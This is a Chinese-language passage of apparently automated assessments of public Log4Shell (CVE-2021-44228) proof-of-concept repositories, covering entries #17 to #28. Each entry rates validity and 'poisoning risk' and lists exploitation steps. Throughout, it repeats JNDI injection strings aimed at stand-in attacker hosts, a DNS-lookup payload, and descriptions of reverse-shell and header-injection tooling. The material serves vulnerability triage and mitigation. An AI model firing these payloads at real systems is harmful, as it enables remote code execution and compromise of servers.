提供的 POC 代码是有效的，它演示了如何利用此漏洞。它包含一个 Dockerfile，用于构建包含漏洞的 Tomcat 应用，以及一个 Python 脚本，用于自动化漏洞利用过程，包括设置恶意的 LDAP 服务器和 HTTP 服务器，并生成 Payload。

**投毒风险：**
尽管该存储库旨在作为概念验证，但仍存在一定的投毒风险。 虽然代码本身没有明显的恶意功能，但它简化了漏洞利用，这可能会增加被不道德行为者利用的风险。`poc.py` 脚本中的部分代码存在可疑行为，比如 Java 代码的字符串拼接，以及 `Proc` 类的调用，这些地方有可能隐藏恶意指令。 因此，投毒风险评估为 10%。使用此 PoC 时应采取预防措施，例如在隔离环境中进行。

**利用方式：**
1.  攻击者发送包含 JNDI 查找字符串（例如 `${jndi:ldap://attacker.com/evil}`）的特制日志消息。该字符串会被 Log4j2 解析。
2.  Log4j2 尝试通过 JNDI 连接到攻击者控制的 LDAP 服务器。
3.  LDAP 服务器响应，并返回一个 Java 类的 URL。
4.  Log4j2 下载并执行该 Java 类，从而允许攻击者在目标系统上执行任意代码。

该 POC 仓库提供了一个 Dockerfile 用来构建一个有漏洞的web应用，以及一个 Python 脚本，它模拟了攻击者的 LDAP 服务器和 Payload 生成器，并自动化了利用过程。攻击者需要监听一个端口来接受反向shell连接。 使用方法是在目标服务存在漏洞的地方插入恶意的 JNDI 字符串。

**项目地址:** [YangHyperData/LOGJ4_PocShell_CVE-2021-44228](https://github.com/YangHyperData/LOGJ4_PocShell_CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #18

**来源**: [CVE-2021-44228-ZacharyZcR_CVE-2021-44228.md](../2021/CVE-2021-44228-ZacharyZcR_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (不包括安全版本 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标应用程序使用受影响的Log4j2版本，并且允许消息查找替换

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许未经身份验证的远程代码执行。攻击者可以通过将恶意的 JNDI 查找字符串注入到 Log4j2 可以记录的任何输入中来利用此漏洞。当 Log4j2 尝试解析并执行该 JNDI 查找时，它可能会从攻击者控制的 LDAP 或其他 JNDI 相关端点加载任意代码。

**有效性：**
提供的 PoC 代码是有效的。它使用 `${jndi:dns://${sys:java.version}.z72ouf.dnslog.cn}` 格式的 JNDI 注入，该注入会触发 DNS 查询到 `z72ouf.dnslog.cn`，从而验证漏洞是否已成功利用。 `${sys:java.version}` 获取Java版本号。

**投毒风险：**
此仓库中不太可能存在作者隐藏的投毒代码（0%）。提供的文件看起来直接针对演示和利用 CVE-2021-44228 漏洞。 `pom.xml` 文件定义了 log4j-core 和 log4j-api 的依赖项。`log4j2.xml` 文件配置了基本的日志记录。 `CVE202144228.java` 文件包含利用该漏洞的有效负载，该负载会生成 DNS 查询以进行验证。 由于该PoC的主要作用是为了验证漏洞，而非植入后门，因此认为投毒风险低。

**利用方式：**
1.  攻击者找到应用程序中记录用户可控输入的位置。 这些位置可能包括 HTTP header，POST 数据，GET 参数等，总之，所有程序日志可以记录的地方。
2.  攻击者将恶意 JNDI 查找字符串（例如`${jndi:ldap://attacker.com/Exploit}`）注入到此输入中。
3.  当应用程序记录此输入时，Log4j2 会尝试解析 JNDI 查找。
4.  Log4j2 会连接到攻击者控制的 LDAP 服务器（或其他的 JNDI 服务）。
5.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
6.  Log4j2 加载并执行此恶意 Java 类，从而允许攻击者在目标系统上执行任意代码。
7. 缓解措施包括升级 Log4j2 到 >=2.17.0 版本，禁用 JNDI 查找，或设置 `log4j2.formatMsgNoLookups=true`。


**项目地址:** [ZacharyZcR/CVE-2021-44228](https://github.com/ZacharyZcR/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #19

**来源**: [CVE-2021-44228-arabindadora_log4shell.md](../2021/CVE-2021-44228-arabindadora_log4shell.md)

## CVE-2021-44228 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 严重，允许未经身份验证的远程代码执行

**影响版本:** <= 2.14.1 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j版本，并且允许记录用户可控的输入，同时启用消息查找替换。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个存在于Apache Log4j2中的严重漏洞。该漏洞允许攻击者通过向日志消息或日志消息参数中注入恶意JNDI查找字符串，例如`${jndi:ldap://attacker.com/a}`，来执行任意代码。当Log4j2处理包含该字符串的日志消息时，它会尝试通过JNDI从攻击者控制的LDAP服务器检索Java对象。如果JVM配置允许，该对象将被反序列化并执行，从而导致远程代码执行。

**利用方式：**
1.  攻击者识别使用Log4j2且记录用户可控输入的应用程序。
2.  攻击者构造包含恶意JNDI查找的payload，并将其注入到应用程序可以记录的任何输入字段中（例如，HTTP头、表单参数等）。
3.  当应用程序记录包含恶意payload的输入时，Log4j2会尝试解析JNDI查找。
4.  Log4j2向攻击者控制的LDAP服务器发出请求。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的引用。
6.  应用程序下载并执行恶意Java类，从而允许攻击者在目标系统上执行任意代码。

**评估POC代码：**
提供的PoC代码包含一个Dockerfile和Makefile，用于演示和利用CVE-2021-44228漏洞。Makefile包含用于构建Docker容器、启动/停止应用程序、触发漏洞利用和修补受害者应用程序的命令。`make exploit` 命令使用curl发送一个包含恶意JNDI payload的HTTP请求，该payload的目标是`${jndi:ldap://$(LHOST):$(LPORT)/a}`。该代码有效演示了漏洞利用。

**投毒风险：**
虽然PoC代码本身旨在演示和利用该漏洞，但任何从不受信任的来源下载的代码都存在潜在的风险。在本例中，投毒风险较低（约为10%），因为代码相对简单且易于审查。需要注意的是，Makefile的`exploit`命令和docker-compose.yml 中涉及的镜像如果被篡改，可能会引入恶意行为。用户应仔细检查所有代码，尤其是与网络连接和代码执行相关的部分，然后再执行PoC。代码中提供的Exploit.class ，本身就是一个后门代码,务必不要把POC验证的后门代码判定为投毒代码。docker-compose.yml 中涉及的镜像需要人工review.

**项目地址:** [arabindadora/log4shell](https://github.com/arabindadora/log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #20

**来源**: [CVE-2021-44228-asd58584388_CVE-2021-44228.md](../2021/CVE-2021-44228-asd58584388_CVE-2021-44228.md)

## CVE-2021-44228 Apache Log4j2 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j2版本，允许记录用户可控的输入，且启用了message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者通过发送包含特定格式的恶意字符串（例如`${jndi:ldap://attacker.com/exploit}`）到应用程序，如果应用程序使用Log4j2记录该字符串，则Log4j2会尝试通过JNDI从攻击者控制的LDAP服务器检索恶意代码，并执行该代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的POC代码是有效的。大量报告表明该漏洞已被广泛利用。

**投毒风险：**
提供的漏洞利用代码存储库主要包含漏洞分析和利用说明，以及用于设置LDAP和HTTP服务器的示例。`README.md`详细解释了漏洞的利用过程，并提供了相关的图片说明。`LICENSE`文件表明作者声明了代码的版权和使用许可。`marshalsec`目录可能包含利用所需的工具或者payload。总体来看，该仓库主要目的是为了分析和演示该漏洞，而非恶意投毒。但由于代码包含执行恶意代码的步骤，因此存在一定风险。我判断投毒的可能性是10%。因为`marshalsec`工具本身具备一定的攻击性，如果用户不熟悉该工具，可能会被误导或者滥用。

**利用方式：**
1.  攻击者构造包含JNDI查找的恶意请求字符串，例如 `${jndi:ldap://evil.com/a}`。
2.  应用程序使用存在漏洞的Log4j2版本记录此字符串。
3.  Log4j2解析字符串，发起JNDI请求到攻击者控制的LDAP服务器 `evil.com`。
4.  LDAP服务器返回一个指向恶意Java类的URL。
5.  Log4j2加载并执行该恶意Java类，导致远程代码执行。
6.  攻击者可以在目标服务器上执行任意命令。

**项目地址:** [asd58584388/CVE-2021-44228](https://github.com/asd58584388/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #21

**来源**: [CVE-2021-44228-axisops_CVE-2021-44228.md](../2021/CVE-2021-44228-axisops_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，且允许Log消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j 2 中的一个严重漏洞，它允许攻击者通过控制日志消息或日志消息参数来执行任意代码。漏洞原理是 Log4j 2 启用了 JNDI 功能，该功能允许从 LDAP 服务器等远程位置加载代码。攻击者可以构造包含 JNDI 查找的恶意日志消息，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j 2 记录此消息时，它会尝试从 attacker.com 加载并执行代码。

**利用方式：**

1.  攻击者向使用 Log4j2 的应用程序发送包含恶意 JNDI 查找的请求。这些请求可以通过多种方式发送，例如 HTTP 请求头、POST 请求参数、WebSocket 消息等，只要这些数据会被Log4j记录即可。
2.  应用程序使用 Log4j2 记录接收到的请求，包括恶意 JNDI 查找字符串。
3.  Log4j2 解析日志消息，识别 JNDI 查找字符串，并尝试通过 JNDI 连接到指定的 LDAP 服务器（`attacker.com`）。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行恶意 Java 类，从而允许攻击者在服务器上执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的POC是有效的，并且已经在野外被广泛利用。

**投毒风险：**

提供的漏洞利用代码是一个缓解脚本，旨在移除 Log4j JAR 文件中易受攻击的 `JndiLookup` 类。虽然该脚本本身旨在缓解漏洞，但仍然存在一些投毒风险：

*   **依赖项：**  该脚本依赖于 `PyYAML` 和系统命令 `zip` 和 `zipinfo`。如果这些依赖项被篡改或存在漏洞，可能会导致脚本执行恶意代码。
*   **配置：**  该脚本使用 `config.yaml` 文件进行配置。如果攻击者可以修改此配置文件，他们可能会将脚本指向恶意位置或执行其他恶意操作。
*   **脚本逻辑：** 脚本尝试从指定目录查找并修改JAR文件。 存在一定风险，即如果脚本逻辑存在缺陷，脚本可能会意外删除或损坏重要的JAR文件，导致服务中断，但造成远程代码执行的可能性较小。 投毒风险预估为5%。

**项目地址:** [axisops/CVE-2021-44228](https://github.com/axisops/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #22

**来源**: [CVE-2021-44228-b-abderrahmane_CVE-2021-44228-playground.md](../2021/CVE-2021-44228-b-abderrahmane_CVE-2021-44228-playground.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用受影响的Log4j2版本，且启用了message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，又名Log4Shell，是Apache Log4j2中的一个严重漏洞。该漏洞源于Log4j2的JNDI功能未对攻击者控制的LDAP和其他JNDI相关端点提供保护。攻击者可以通过控制日志消息或日志消息参数，利用message lookup substitution功能从LDAP服务器加载并执行任意代码，从而实现远程代码执行(RCE)。

**漏洞利用方式：**

1.  **构造恶意请求：** 攻击者构造包含JNDI查找表达式的恶意请求，例如`${jndi:ldap://attacker.com/evil}`。该表达式会被记录到日志中。
2.  **JNDI查找：** Log4j2解析日志消息时，会识别并执行JNDI查找表达式。
3.  **LDAP请求：** Log4j2向攻击者控制的LDAP服务器(attacker.com)发起LDAP请求。
4.  **恶意代码加载：** LDAP服务器响应一个包含恶意Java类的URL。
5.  **远程代码执行：** Log4j2从URL加载并执行恶意Java类，导致RCE。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞利用的POC代码是有效的。搜索引擎结果中多个条目（如CISA，Palo Alto Networks，Sysdig，Cloudflare, NVD等）都确认了该漏洞的存在以及公开的POC代码的存在。漏洞库信息也明确指出该漏洞可以被利用来执行任意代码。

**投毒风险：**
提供的漏洞利用代码只包含GNU GPL协议文本，是一个许可协议，不包含任何可执行的代码。因此，判断此仓库中不存在作者隐藏的投毒代码，风险为0%。 该协议只声明了软件的使用许可，无法直接用于漏洞利用或者进行恶意攻击，与Log4Shell漏洞本身没有直接关系。


**项目地址:** [b-abderrahmane/CVE-2021-44228-playground](https://github.com/b-abderrahmane/CVE-2021-44228-playground)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #23

**来源**: [CVE-2021-44228-cuijiung_log4j-CVE-2021-44228.md](../2021/CVE-2021-44228-cuijiung_log4j-CVE-2021-44228.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 Log4j2 并且启用了消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228，又称Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过向Log4j2记录的日志消息中注入恶意的JNDI查找字符串来利用此漏洞。当Log4j2处理包含`\${jndi:}`语法的字符串时，它会尝试通过JNDI（Java Naming and Directory Interface）来解析该字符串。攻击者可以利用这一点，将JNDI指向恶意的LDAP或其他JNDI服务，从而使Log4j2从攻击者控制的服务器上加载并执行任意Java代码，导致远程代码执行(RCE)。

**有效性：**

根据漏洞库信息、搜索结果和提供的POC代码，可以确定该漏洞利用代码是有效的。搜索结果中多个链接（例如NVD, CISA, Unit 42, Cloudflare, Red Hat, Oracle, Microsoft, Sysdig, Picus Security, CrowdStrike）都表明CVE-2021-44228是一个被广泛利用的RCE漏洞。POC代码通过`logger.error("${jndi:ldap://127.0.0.1:1389/any}")`演示了如何触发JNDI查找，如果目标系统存在漏洞，则会尝试连接到指定的LDAP服务器，从而允许远程代码执行。

**投毒风险：**

提供的代码仓库主要包含一个简单的 Maven 项目，包括 `pom.xml` 和 `Main.java` 文件。

*   `pom.xml`: 定义了项目依赖，仅包含 `log4j-core`，版本为 `2.14.1`，这是一个受漏洞影响的版本。
*   `Main.java`: 包含一个简单的 Log4j2 日志记录器，它会记录一条包含 JNDI 注入payload的错误消息。

此仓库的投毒风险较低，约为 5%。主要原因是：

1.  **代码量少且简单**：整个仓库的代码非常少，容易审查。
2.  **目的明确**：代码的目的是为了演示 CVE-2021-44228 漏洞的利用，`Main.java` 中的 payload 清晰可见。
3.  **无恶意行为**：代码本身除了触发 JNDI 查找外，没有其他恶意行为，例如文件操作、网络连接等。

但是，仍然存在极低的风险，比如构建脚本或IDE配置中可能存在隐藏的恶意代码。所以给出5%的风险评估。

**利用方式：**

1.  **攻击者控制日志消息：** 攻击者需要找到一种方法，使包含恶意JNDI查找字符串（例如 `${jndi:ldap://attacker.com/evil}`）的消息被Log4j2记录。
2.  **触发JNDI查找：** 当Log4j2记录包含恶意JNDI查找字符串的消息时，它会尝试通过JNDI连接到攻击者指定的LDAP服务器。
3.  **恶意LDAP服务器：** 攻击者需要设置一个恶意的LDAP服务器，该服务器会返回一个指向恶意Java类的URL。
4.  **远程代码执行：** Log4j2会从URL下载并执行恶意Java类，从而导致远程代码执行。攻击者可以通过这种方式在目标系统上执行任意命令。

**项目地址:** [cuijiung/log4j-CVE-2021-44228](https://github.com/cuijiung/log4j-CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #24

**来源**: [CVE-2021-44228-d4ngkh04w_CVE-2021-44228-Apache-Log4j.md](../2021/CVE-2021-44228-d4ngkh04w_CVE-2021-44228-Apache-Log4j.md)

## CVE-2021-44228-Log4Shell-RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可能导致完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包含安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的Log4j2，且启用了message lookup substitution功能。攻击者能够控制Log4j2记录的日志消息或参数。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的严重远程代码执行漏洞。该漏洞利用了Log4j2的JNDI（Java Naming and Directory Interface）特性，允许攻击者通过控制日志消息或参数，注入恶意的JNDI查找字符串。当Log4j2解析并执行这些字符串时，它会从攻击者控制的LDAP或其他JNDI服务下载并执行任意Java代码，从而实现远程代码执行。 

**有效性：**根据漏洞库信息和搜索结果，此漏洞影响广泛，且存在公开可用的漏洞利用代码，因此该漏洞的利用是有效的。

**投毒风险：**提供的Dockerfile用于构建包含app.jar的镜像。Exploit.java代码尝试建立一个反向shell连接到 `host.docker.internal` 的9000端口。该代码本身并没有发现明显的投毒行为，而是实现了漏洞利用的基本功能，即建立反向shell。`host.docker.internal` 在docker 容器中可以解析为主机的ip地址。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者找到一个应用程序，该程序使用易受攻击版本的Log4j2并记录用户可控的输入。
2.  攻击者将恶意JNDI查找字符串（例如 `${jndi:ldap://attacker.com/Exploit}`）注入到这些输入中。
3.  当Log4j2记录包含恶意字符串的日志消息时，它会尝试解析JNDI查找。
4.  Log4j2连接到攻击者控制的LDAP服务器（或其它JNDI服务）。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的URL。
6.  Log4j2从URL下载并执行恶意Java类，从而实现远程代码执行。例如提供的Exploit.java。
7.  Exploit.java 代码，会尝试创建一个反向shell，连接到攻击者指定的 `host:port` ，从而控制目标系统。

**项目地址:** [d4ngkh04w/CVE-2021-44228-Apache-Log4j](https://github.com/d4ngkh04w/CVE-2021-44228-Apache-Log4j)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #25

**来源**: [CVE-2021-44228-fabioeletto_hka-seminar-log4shell.md](../2021/CVE-2021-44228-fabioeletto_hka-seminar-log4shell.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且启用了 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许攻击者通过 JNDI 注入执行任意代码。漏洞利用方式如下：

1.  **攻击者发送恶意请求：** 攻击者向目标系统发送一个包含特定格式的字符串（例如 `${jndi:ldap://attacker.com/exploit}`）的请求，这个字符串会被 Log4j2 记录。
2.  **Log4j2 解析恶意字符串：** 当 Log4j2 尝试记录包含`${jndi:...}`的字符串时，它会触发 JNDI lookup。
3.  **JNDI 发起 LDAP 查询：** JNDI 会根据 URL (例如 `ldap://attacker.com/exploit`) 发起 LDAP 查询请求攻击者控制的 LDAP 服务器。
4.  **LDAP 服务器返回恶意引用：** 攻击者的 LDAP 服务器返回一个包含恶意 Java 类的引用。
5.  **Log4j2 加载并执行恶意代码：** Log4j2 尝试从指定的 URL 加载并实例化这个 Java 类，从而执行攻击者提供的任意代码。

**有效性：**

根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，并且存在公开可用的 PoC。提供的漏洞利用代码库是一个用于演示 Log4Shell 漏洞的教育项目，因此其有效性是为了演示漏洞而设计的。

**投毒风险：**

评估此代码库的投毒风险较低，约为 10%。

*   代码库的 `README.md` 文件明确声明其目的是为了教育和演示 Log4Shell 漏洞，并警告用户不要在生产环境中使用。
*   代码库结构清晰，主要包含一个易受攻击的 Spring Boot 应用程序 (`vulnerable-app`)，一个模拟恶意 LDAP 服务器的 `marshalsec` fork，和一个提供恶意 Java 类的 HTTP 服务器 (`payload-server`)。
*   虽然存在通过修改 `Exploit.class` 文件来植入恶意代码的可能性，但这种投毒行为相对容易被发现，因为其主要目的是演示漏洞，所以更可能是测试后门连接，并非投毒代码。
*   代码贡献者 Fabio Eletto 已经明确声明了代码的用途，降低了恶意使用的可能性。

但是，用户仍然需要谨慎使用此代码库，务必在隔离的环境中进行测试，并仔细审查代码以确保安全。

**项目地址:** [fabioeletto/hka-seminar-log4shell](https://github.com/fabioeletto/hka-seminar-log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #26

**来源**: [CVE-2021-44228-julian911015_Log4j-Scanner-Exploit.md](../2021/CVE-2021-44228-julian911015_Log4j-Scanner-Exploit.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用了受影响的 Log4j2 版本，且允许 message lookup substitution

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是 Apache Log4j2 中的一个严重漏洞，它允许攻击者通过 JNDI 注入执行远程代码。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 功能，从 LDAP 服务器加载恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，此漏洞是真实且已被广泛利用的。提供的 POC 代码尝试通过构造包含 JNDI 查找的恶意 payload，触发漏洞。

**投毒风险：**
代码主要功能是利用 Log4Shell 漏洞进行扫描和利用。虽然代码本身是为了利用漏洞，但存在一些潜在的风险，可能被恶意修改后进行投毒：

*   **Payload 修改：** 攻击者可以修改 payload，使其执行恶意操作，例如下载并执行其他恶意软件。
*   **LDAP 服务器：** 攻击者可能控制 LDAP 服务器，导致被攻击者下载恶意 payload。
*   **后门植入：** 攻击者可能会在扫描或利用过程中，通过漏洞在目标系统上植入后门，以便长期控制。

综合来看，代码本身具有一定的风险，需要谨慎使用。这里给出10%的投毒风险评估，因为代码的功能和目标较为明确，主要风险在于使用者可能被引导至恶意的LDAP服务器。

**利用方式：**

1.  **构建恶意 Payload：** 攻击者构造包含 JNDI 查找的字符串，例如 `${jndi:ldap://attacker.com/Exploit}`。
2.  **触发日志记录：** 将恶意 payload 注入到应用程序的日志消息中。这可以通过多种方式实现，例如通过 HTTP 请求头（User-Agent、X-Forwarded-For 等）、POST 请求参数或其他任何会被记录到日志中的输入。
3.  **JNDI 查找：** 当 Log4j2 尝试记录包含恶意 payload 的日志消息时，它会触发 JNDI 查找。
4.  **远程代码执行：** JNDI 查找会导致应用程序连接到攻击者控制的 LDAP 服务器，并下载和执行恶意代码。

提供的漏洞利用代码通过以下步骤尝试利用漏洞：

1.  **启动 LDAP 和 HTTP 服务器：** 使用 `JNDIExploit` 工具启动一个恶意的 LDAP 服务器，用于提供恶意 payload。同时启动一个 HTTP 服务器，用于托管 payload 文件。
2.  **扫描目标 URL：** 从指定的 URL 字典中读取 URL，并向这些 URL 发送包含恶意 payload 的 HTTP 请求。
3.  **注入 Payload 到 HTTP 头：** 将 payload 注入到 `X-Api-Version`、`User-Agent` 和 `X-Forwarded-For` 等常见的 HTTP 头中。
4.  **注入 Payload 到 URL 参数：** 将 payload 注入到 URL 参数中。

通过以上步骤，攻击者可以尝试触发目标应用程序的 Log4j2 漏洞，并执行远程代码。

**项目地址:** [julian911015/Log4j-Scanner-Exploit](https://github.com/julian911015/Log4j-Scanner-Exploit)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #27

**来源**: [CVE-2021-44228-khaidtraivch_CVE-2021-44228-Log4Shell-.md](../2021/CVE-2021-44228-khaidtraivch_CVE-2021-44228-Log4Shell-.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，并且允许消息查找替换功能（默认启用）。攻击者需要能够控制 Log4j2 记录的日志消息或参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又称 Log4Shell，是一个存在于 Apache Log4j2 中的远程代码执行漏洞。该漏洞源于 Log4j2 的 JNDI (Java Naming and Directory Interface) 功能，该功能允许在日志消息中执行 JNDI 查找。如果攻击者可以控制日志消息的内容，他们就可以注入恶意的 JNDI 查找字符串，从而导致 Log4j2 从攻击者控制的 LDAP 或其他 JNDI 服务加载并执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，CVE-2021-44228 是一个被广泛利用的严重漏洞。 搜索结果中提供了多个关于漏洞分析、缓解措施和利用的链接。虽然提供的漏洞利用代码仓库只包含一个 README.md 文件，信息很少。但考虑到CVE本身的严重性和公开性，判断存在有效的PoC。

**投毒风险：**
提供的漏洞利用代码仓库 `/tmp/b3e5418f03d45523b0a6001074bd0614/README.md` 只包含简单的描述信息 "CVE-2021-44228-Log4Shell-Kiểm thử xâm nhập" (越南语，意思是渗透测试)。**无法直接从该文件判断是否存在投毒代码。** 但从代码仓库的简洁程度来看，作者可能意图引导用户从其他渠道获取EXP，增加了恶意代码嵌入的可能性，**因此存在一定的投毒风险。风险评估为10%**。

**利用方式：**
漏洞利用的核心在于构造包含恶意 JNDI 查找的日志消息，例如：`${jndi:ldap://attacker.com/evil}`。当 Log4j2 记录包含此字符串的消息时，它会尝试连接到 `attacker.com` 上的 LDAP 服务器，并加载和执行从该服务器返回的 Java 代码。

**攻击步骤：**
1.  攻击者找到一个使用 Log4j2 的应用程序，该应用程序会将攻击者可控的数据记录到日志中。
2.  攻击者将包含恶意 JNDI 查找字符串的payload注入到应用程序的输入字段，例如 HTTP Header (User-Agent, X-Forwarded-For等等)、POST 参数、GET 参数或其他任何会被记录到日志中的数据。
3.  当应用程序记录包含该字符串的日志消息时，Log4j2 会尝试执行 JNDI 查找。
4.  如果应用程序配置允许，Log4j2 将连接到攻击者控制的 JNDI 服务器（例如 LDAP），并下载和执行恶意 Java 代码。

**缓解措施：**
*   升级 Log4j2 到 2.17.1 或更高版本。
*   如果无法升级，可以设置系统属性 `log4j2.formatMsgNoLookups=true` 或环境变量 `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`，以禁用消息查找替换功能。
*   删除 `JndiLookup` 类。

**项目地址:** [khaidtraivch/CVE-2021-44228-Log4Shell-](https://github.com/khaidtraivch/CVE-2021-44228-Log4Shell-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #28

**来源**: [CVE-2021-44228-mgueye3_Log4Shell.md](../2021/CVE-2021-44228-mgueye3_Log4Shell.md)

## CVE-2021-44228-Apache Log4j2-JNDI 注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI 注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228 (Log4Shell) 漏洞存在于 Apache Log4j2 中，由于其 JNDI 功能未对攻击者控制的 LDAP 和其他 JNDI 相关端点进行保护。攻击者可以控制日志消息或日志消息参数，从而在启用消息查找替换时执行从 LDAP 服务器加载的任意代码。

**有效性：**
根据漏洞库信息和大量已公开的漏洞利用案例，此漏洞的利用是有效的。大量资料表明，该漏洞在野外被广泛利用。

**投毒风险：**
提供的漏洞利用代码是一个JSON文件，其中包含一组flag，这些flag很可能是CTF挑战或者渗透测试演练中的结果，而不是实际的漏洞利用代码。因此，可以认为不存在投毒代码。

**利用方式：**
1.  攻击者构造包含 JNDI 查找表达式的恶意字符串，例如 `${jndi:ldap://attacker.com/evil}`。
2.  目标应用程序使用存在漏洞的 Log4j2 版本记录此字符串。
